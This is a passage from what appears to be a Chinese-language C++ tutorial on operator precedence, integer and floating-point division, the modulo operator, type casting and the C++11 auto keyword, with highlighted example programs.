使用括号改变顺序</span></span><br><span class="line">    <span class="keyword">int</span> result2 = (a + b) * c; <span class="comment">// (5 + 8) * 3 = 13 * 3 = 39</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;(a + b) * c = &quot;</span> &lt;&lt; result2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 结合性 (左结合): / 和 * 优先级相同</span></span><br><span class="line">    <span class="keyword">int</span> result3 = b / c * d; <span class="comment">// 等价于 (b / c) * d = (8 / 3) * d = 2 * d = 2 * 2 = 4 (整数除法)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;b / c * d = &quot;</span> &lt;&lt; result3 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 结合性 (右结合): 赋值</span></span><br><span class="line">    <span class="keyword">int</span> x, y, z;</span><br><span class="line">    x = y = z = <span class="number">10</span>; <span class="comment">// 等价于 x = (y = (z = 10))</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;x=&quot;</span> &lt;&lt; x &lt;&lt; <span class="string">&quot;, y=&quot;</span> &lt;&lt; y &lt;&lt; <span class="string">&quot;, z=&quot;</span> &lt;&lt; z &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 x=10, y=10, z=10</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 结合性 (右结合): 一元负号</span></span><br><span class="line">    <span class="keyword">int</span> val = - - <span class="number">5</span>; <span class="comment">// 等价于 -(-5) = 5</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;- - 5 = &quot;</span> &lt;&lt; val &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>建议:</strong> 当表达式复杂或优先级不明确时，使用括号来明确运算顺序，可以提高代码的可读性并避免错误。</p><h2 id="3-4-2-除法分支"><a href="#3-4-2-除法分支" class="headerlink" title="3.4.2 除法分支"></a>3.4.2 除法分支</h2><p>C++ 的除法运算符 <code>/</code> 的行为取决于其<strong>操作数 (Operand)</strong> 的类型：</p><ol><li> <strong>浮点数除法:</strong> 如果操作数中至少有一个是浮点类型 (<code>float</code>, <code>double</code>, <code>long double</code>)，则执行浮点数除法，结果也是浮点类型，包含小数部分。</li><li> <strong>整数除法:</strong> 如果两个操作数都是整数类型 (<code>int</code>, <code>short</code>, <code>long</code>, <code>char</code>, <code>bool</code> 等)，则执行整数除法。结果只保留商的整数部分，小数部分被**截断 (truncated)**（直接丢弃，不是四舍五入）。</li></ol><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 浮点数除法</span></span><br><span class="line">    <span class="keyword">double</span> result_f1 = <span class="number">9.0</span> / <span class="number">5.0</span>; <span class="comment">// 两个 double</span></span><br><span class="line">    <span class="keyword">double</span> result_f2 = <span class="number">9.0</span> / <span class="number">5</span>;   <span class="comment">// 一个 double, 一个 int (int 被提升为 double)</span></span><br><span class="line">    <span class="keyword">double</span> result_f3 = <span class="number">9</span> / <span class="number">5.0</span>;   <span class="comment">// 一个 int, 一个 double (int 被提升为 double)</span></span><br><span class="line">    <span class="keyword">float</span> result_f4 = <span class="number">9.0f</span> / <span class="number">5.0f</span>; <span class="comment">// 两个 float</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;9.0 / 5.0 = &quot;</span> &lt;&lt; result_f1 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 1.8</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;9.0 / 5   = &quot;</span> &lt;&lt; result_f2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 1.8</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;9 / 5.0   = &quot;</span> &lt;&lt; result_f3 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 1.8</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;9.0f / 5.0f = &quot;</span> &lt;&lt; result_f4 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 1.8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 整数除法</span></span><br><span class="line">    <span class="keyword">int</span> result_i1 = <span class="number">9</span> / <span class="number">5</span>;     <span class="comment">// 两个 int</span></span><br><span class="line">    <span class="keyword">int</span> result_i2 = <span class="number">10</span> / <span class="number">3</span>;    <span class="comment">// 两个 int</span></span><br><span class="line">    <span class="keyword">int</span> result_i3 = <span class="number">13</span> / <span class="number">4</span>;    <span class="comment">// 两个 int</span></span><br><span class="line">    <span class="keyword">int</span> result_i4 = <span class="number">-10</span> / <span class="number">3</span>;   <span class="comment">// 负数整数除法 (结果通常向零截断，为 -3)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;9 / 5     = &quot;</span> &lt;&lt; result_i1 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 1 (小数部分 0.8 被截断)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;10 / 3    = &quot;</span> &lt;&lt; result_i2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 3 (小数部分 0.333... 被截断)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;13 / 4    = &quot;</span> &lt;&lt; result_i3 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 3 (小数部分 0.25 被截断)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;-10 / 3   = &quot;</span> &lt;&lt; result_i4 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 -3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 想要得到浮点结果，需要确保至少一个操作数是浮点类型</span></span><br><span class="line">    <span class="comment">// 可以使用类型转换 (见 3.4.4)</span></span><br><span class="line">    <span class="keyword">double</span> result_mixed = <span class="keyword">double</span>(<span class="number">9</span>) / <span class="number">5</span>; <span class="comment">// 将 9 转换为 double</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;double(9) / 5 = &quot;</span> &lt;&lt; result_mixed &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 1.8</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意:</strong> 进行除法运算时，务必清楚操作数的类型，以确保得到期望的结果（整数截断或浮点小数）。</p><h2 id="3-4-3-求模运算符"><a href="#3-4-3-求模运算符" class="headerlink" title="3.4.3 求模运算符"></a>3.4.3 求模运算符</h2><p>求模运算符 <code>%</code> 计算整数除法的**余数 (Remainder)**。它要求两个操作数都必须是整数类型（或可以转换为整数的类型，如 <code>char</code>, <code>bool</code>）。</p><p><strong>运算规则:</strong><br><code>a % b</code> 的结果是 <code>a</code> 除以 <code>b</code> 后的余数。其符号通常与被除数 <code>a</code> 的符号相同（C++11 标准规定如此）。</p><p><strong>数学关系:</strong><br>对于整数 <code>a</code> 和 <code>b</code> (其中 <code>b != 0</code>)，以下关系通常成立：<br><code>(a / b) * b + (a % b) == a</code></p><p><strong>用途:</strong></p><ul><li>  判断一个数是否能被另一个数整除（如果 <code>a % b == 0</code>，则 <code>a</code> 能被 <code>b</code> 整除）。</li><li>  获取一个数的最低位数字（<code>num % 10</code>）。</li><li>  将数值限制在一个范围内（例如，生成 0 到 N-1 之间的数：<code>value % N</code>）。</li><li>  周期性操作（例如，每隔 M 个元素执行一次操作：<code>if (count % M == 0)</code>）。</li></ul><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> total_seconds = <span class="number">135</span>;</span><br><span class="line">    <span class="keyword">int</span> seconds_per_minute = <span class="number">60</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> minutes = total_seconds / seconds_per_minute; <span class="comment">// 整数除法得分钟数</span></span><br><span class="line">    <span class="keyword">int</span> remaining_seconds = total_seconds % seconds_per_minute; <span class="comment">// 求模得剩余秒数</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; total_seconds &lt;&lt; <span class="string">&quot; seconds is &quot;</span> </span><br><span class="line">              &lt;&lt; minutes &lt;&lt; <span class="string">&quot; minutes and &quot;</span> </span><br><span class="line">              &lt;&lt; remaining_seconds &lt;&lt; <span class="string">&quot; seconds.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 135 seconds is 2 minutes and 15 seconds.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断奇偶性</span></span><br><span class="line">    <span class="keyword">int</span> number = <span class="number">21</span>;</span><br><span class="line">    <span class="keyword">if</span> (number % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; number &lt;&lt; <span class="string">&quot; is even.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; number &lt;&lt; <span class="string">&quot; is odd.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 21 is odd.</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取个位数</span></span><br><span class="line">    <span class="keyword">int</span> value = <span class="number">123</span>;</span><br><span class="line">    <span class="keyword">int</span> last_digit = value % <span class="number">10</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The last digit of &quot;</span> &lt;&lt; value &lt;&lt; <span class="string">&quot; is &quot;</span> &lt;&lt; last_digit &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 负数求模 (C++11 及以后，结果符号与被除数一致)</span></span><br><span class="line">    <span class="keyword">int</span> result1 = <span class="number">10</span> % <span class="number">3</span>;   <span class="comment">// 1</span></span><br><span class="line">    <span class="keyword">int</span> result2 = <span class="number">-10</span> % <span class="number">3</span>;  <span class="comment">// -1</span></span><br><span class="line">    <span class="keyword">int</span> result3 = <span class="number">10</span> % <span class="number">-3</span>;  <span class="comment">// 1 </span></span><br><span class="line">    <span class="keyword">int</span> result4 = <span class="number">-10</span> % <span class="number">-3</span>; <span class="comment">// -1</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;10 % 3 = &quot;</span> &lt;&lt; result1 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;-10 % 3 = &quot;</span> &lt;&lt; result2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;10 % -3 = &quot;</span> &lt;&lt; result3 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;-10 % -3 = &quot;</span> &lt;&lt; result4 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 不能用于浮点数</span></span><br><span class="line">    <span class="comment">// double remainder = 10.5 % 3.2; // 编译错误!</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-4-4-类型转换"><a href="#3-4-4-类型转换" class="headerlink" title="3.4.4 类型转换"></a>3.4.4 类型转换</h2><p>C++允许在不同数据类型之间进行转换，这称为<strong>类型转换 (Type Casting)**。转换可以</strong>隐式 (Implicitly)** 发生（由编译器自动完成），也可以<strong>显式 (Explicitly)</strong> 进行（由程序员通过代码指定）。</p><p><strong>隐式类型转换 (Automatic Conversion):</strong></p><p>在以下情况下，编译器会自动执行类型转换：</p><ol><li><strong>混合类型表达式:</strong> 当一个表达式中包含不同数值类型的操作数时，较小或较低优先级的类型通常会被<strong>提升 (Promoted)</strong> 为较大或较高优先级的类型，然后进行运算。<ul><li>  <strong>整型提升 (Integral Promotion):</strong> 比 <code>int</code> 小的整型（<code>bool</code>, <code>char</code>, <code>signed char</code>, <code>unsigned char</code>, <code>short</code>, <code>unsigned short</code>）在表达式中通常会被提升为 <code>int</code> (如果 <code>int</code> 能容纳其所有值) 或 <code>unsigned int</code>。</li><li>  <strong>算术转换 (Usual Arithmetic Conversions):</strong> 在涉及不同算术类型（整型和浮点型）的运算中，遵循一套规则将操作数转换为共同的类型（通常是两者中“更宽”或精度更高的类型）。例如，<code>int</code> 和 <code>double</code> 运算时，<code>int</code> 会被转换为 <code>double</code>。<code>float</code> 和 <code>double</code> 运算时，<code>float</code> 会被转换为 <code>double</code>。</li></ul></li><li> <strong>赋值:</strong> 将一个类型的值赋给另一种类型的变量时，右侧的值会被转换为左侧变量的类型。这可能导致精度损失（如 <code>double</code> 转 <code>int</code>）或范围问题（如 <code>long</code> 转 <code>short</code>）。</li><li> <strong>函数参数传递:</strong> 将参数传递给函数时，如果实参类型与形参类型不匹配，会尝试进行转换。</li><li> <strong>函数返回值:</strong> 从函数返回一个值时，如果返回值类型与函数声明的返回类型不匹配，会尝试进行转换。</li></ol><p><strong>显式类型转换 (Explicit Casting):</strong></p><p>当需要强制进行类型转换，或者为了使代码意图更清晰时，可以使用显式类型转换。C++提供了多种转换方式：</p><ol><li><p><strong>C 风格强制类型转换 (C-Style Cast):</strong></p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(typeName) expression</span><br><span class="line">typeName (expression) <span class="comment">// 函数式转换</span></span><br></pre></td></tr></table></figure><p> 这种方式简单直接，但在某些情况下不够安全，因为它可能执行多种不同类型的转换（如 <code>static_cast</code>, <code>const_cast</code>, <code>reinterpret_cast</code> 的组合）。</p></li><li><p><strong>C++ 类型转换运算符 (C++ Cast Operators):</strong> (更推荐，更安全，意图更明确)</p><ul><li>  <code>static_cast&lt;typeName&gt;(expression)</code>: 用于比较“自然”和安全的转换，如数值类型之间的转换（整数与浮点数互转、整数与整数互转）、指针类型之间的相关转换（如 <code>void*</code> 与其他类型指针互转、基类指针与派生类指针互转，但需要谨慎）。这是最常用的 C++ 转换符。</li><li>  <code>dynamic_cast&lt;typeName&gt;(expression)</code>: 主要用于处理类继承层次结构中的指针或引用转换（向下转型），并在运行时进行类型检查。如果转换无效，对于指针会返回 <code>nullptr</code>，对于引用会抛出 <code>std::bad_cast</code> 异常。需要基类是多态的（至少有一个虚函数）。</li><li>  <code>const_cast&lt;typeName&gt;(expression)</code>: 用于添加或移除表达式的 <code>const</code> 或 <code>volatile</code> 限定符。通常用于去除 <code>const</code>，但修改原本是 <code>const</code> 的对象是未定义行为。主要用于处理常量性不匹配的旧 API。</li><li>  <code>reinterpret_cast&lt;typeName&gt;(expression)</code>: 用于低级别的、通常与实现相关的、不安全的转换。例如，在整数和指针之间进行转换，或者在不相关的指针类型之间进行转换。应极力避免使用，除非确实理解其底层含义和风险。</li></ul></li></ol><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 隐式转换示例</span></span><br><span class="line">    <span class="keyword">int</span> i_val = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">double</span> d_val = <span class="number">3.14</span>;</span><br><span class="line">    <span class="keyword">short</span> s_val = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 混合表达式 (算术转换)</span></span><br><span class="line">    <span class="keyword">double</span> result1 = i_val + d_val; <span class="comment">// i_val (int) 提升为 double (10.0), 结果是 double (13.14)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;int + double = &quot;</span> &lt;&lt; result1 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 整型提升</span></span><br><span class="line">    <span class="keyword">char</span> c_val = <span class="string">&#x27;A&#x27;</span>; <span class="comment">// ASCII 码 65</span></span><br><span class="line">    <span class="keyword">int</span> result2 = c_val + s_val; <span class="comment">// c_val (char) 和 s_val (short) 都提升为 int, 结果是 int (70)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;char + short = &quot;</span> &lt;&lt; result2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 赋值转换 (可能丢失信息)</span></span><br><span class="line">    <span class="keyword">int</span> i_from_d = d_val; <span class="comment">// d_val (3.14) 转换为 int, 小数部分截断, i_from_d 变为 3</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;int from double = &quot;</span> &lt;&lt; i_from_d &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">short</span> s_from_i = <span class="number">100000</span>; <span class="comment">// 100000 可能超出 short 范围, 结果未定义或回绕</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;short from large int = &quot;</span> &lt;&lt; s_from_i &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 显式转换示例</span></span><br><span class="line">    <span class="keyword">int</span> total = <span class="number">19</span>;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// C 风格转换 (用于浮点除法)</span></span><br><span class="line">    <span class="keyword">double</span> average1 = (<span class="keyword">double</span>)total / count; </span><br><span class="line">    <span class="keyword">double</span> average2 = <span class="keyword">double</span>(total) / count; <span class="comment">// 函数式转换</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;(double)total / count = &quot;</span> &lt;&lt; average1 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 3.8</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;double(total) / count = &quot;</span> &lt;&lt; average2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 3.8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// C++ static_cast (推荐用于数值转换)</span></span><br><span class="line">    <span class="keyword">double</span> average3 = <span class="keyword">static_cast</span>&lt;<span class="keyword">double</span>&gt;(total) / count;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;static_cast&lt;double&gt;(total) / count = &quot;</span> &lt;&lt; average3 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 3.8</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> char_code = <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(<span class="string">&#x27;B&#x27;</span>); <span class="comment">// char 转 int</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Code for &#x27;B&#x27;: &quot;</span> &lt;&lt; char_code &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 66</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 演示 reinterpret_cast (通常不推荐)</span></span><br><span class="line">    <span class="keyword">long</span> addr = <span class="number">1000</span>;</span><br><span class="line">    <span class="comment">// int* ptr = reinterpret_cast&lt;int*&gt;(addr); // 将整数视为地址 (危险!)</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; &quot;Pointer from address: &quot; &lt;&lt; ptr &lt;&lt; std::endl;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>建议:</strong></p><ul><li>  尽量避免不必要的类型转换。</li><li>  优先使用 C++ 的 <code>static_cast</code> 进行明确且相对安全的数值或相关指针转换。</li><li>  谨慎使用 C 风格转换，因为它隐藏了转换的类型和风险。</li><li>  仅在绝对必要且理解后果的情况下使用 <code>const_cast</code> 和 <code>reinterpret_cast</code>。</li><li>  注意隐式转换可能导致的精度损失或意外行为，尤其是在混合有符号和无符号整数时。</li></ul><h2 id="3-4-5-C-11中的auto声明"><a href="#3-4-5-C-11中的auto声明" class="headerlink" title="3.4.5 C++11中的auto声明"></a>3.4.5 C++11中的auto声明</h2><p>C++11 引入了 <code>auto</code> 关键字，它允许编译器根据变量的<strong>初始化表达式 (Initializer)</strong> 自动推断出变量的类型。这可以简化代码，尤其是在处理复杂类型（如 STL 迭代器或模板类型）时。</p><p><strong>工作原理:</strong></p><p>当你使用 <code>auto</code> 声明变量时，必须提供一个初始化表达式。编译器会查看这个表达式的类型，并将该类型赋予 <code>auto</code> 声明的变量。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> variableName = initializationExpression;</span><br></pre></td></tr></table></figure><p><strong>要点:</strong></p><ul><li>  <strong>必须初始化:</strong> 使用 <code>auto</code> 声明的变量必须在声明时初始化。</li><li>  <strong>类型推断:</strong> 类型是从初始化表达式推断出来的，而不是变量本身的某种默认类型。</li><li><strong><code>const</code> 和引用:</strong> <code>auto</code> 通常不会自动推断出顶层的 <code>const</code> 或引用。如果需要 <code>const</code> 或引用，需要显式添加。<ul><li>  <code>auto x = value;</code> // x 的类型与 value 相同 (const/引用被剥离)</li><li>  <code>const auto cx = value;</code> // cx 是 const 类型</li><li>  <code>auto&amp; rx = value;</code> // rx 是引用类型</li><li>  <code>const auto&amp; crx = value;</code> // crx 是 const 引用类型</li></ul></li><li><strong>列表初始化:</strong> 对于 C++11 中的列表初始化 <code>&#123;&#125;</code>，<code>auto</code> 的推断规则比较特殊。<ul><li>  <code>auto x = &#123;1, 2, 3&#125;;</code> // C++11/14: x 被推断为 std::initializer_list<int></li><li>  <code>auto y = &#123;1&#125;;</code> // C++11/14: y 被推断为 std::initializer_list<int></li><li>  <code>auto z&#123;1&#125;;</code> // C++17: z 被推断为 int (注意没有等号)</li></ul></li></ul><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt; // 包含 vector</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;typeinfo&gt; // 用于 typeid (仅作演示)</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 基本类型推断</span></span><br><span class="line">    <span class="keyword">auto</span> i = <span class="number">10</span>;       <span class="comment">// i 被推断为 int</span></span><br><span class="line">    <span class="keyword">auto</span> d = <span class="number">3.14</span>;     <span class="comment">// d 被推断为 double</span></span><br><span class="line">    <span class="keyword">auto</span> f = <span class="number">3.14f</span>;    <span class="comment">// f 被推断为 float</span></span><br><span class="line">    <span class="keyword">auto</span> c = <span class="string">&#x27;A&#x27;</span>;      <span class="comment">// c 被推断为 char</span></span><br><span class="line">    <span class="keyword">auto</span> b = <span class="literal">true</span>;     <span class="comment">// b 被推断为 